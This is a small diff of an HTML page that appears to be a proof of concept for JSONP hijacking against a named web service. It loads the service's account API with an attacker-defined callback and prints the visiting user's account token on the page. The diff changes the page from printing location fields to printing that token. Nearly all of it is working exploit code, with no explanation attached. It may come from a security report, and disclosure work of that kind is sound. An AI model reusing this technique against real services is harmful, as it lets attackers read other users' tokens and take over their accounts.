@@ -7,11 +7,10 @@
 
     function myCallback(data){
 
-        document.write("IP is : " , data.loc["token"])
+        document.write("TOKEN  is : <font color='red'> " , data.token)
         document.write("<br>")
-        document.write("Region is : " , data.loc["region_name"])
     }
 
 </script>
 
-<script src="https://h1.brainhq.com/api/v2/acct?callback=jensec"></script>
+<script src="https://h1.brainhq.com/api/v2/acct?callback=myCallback"></script>
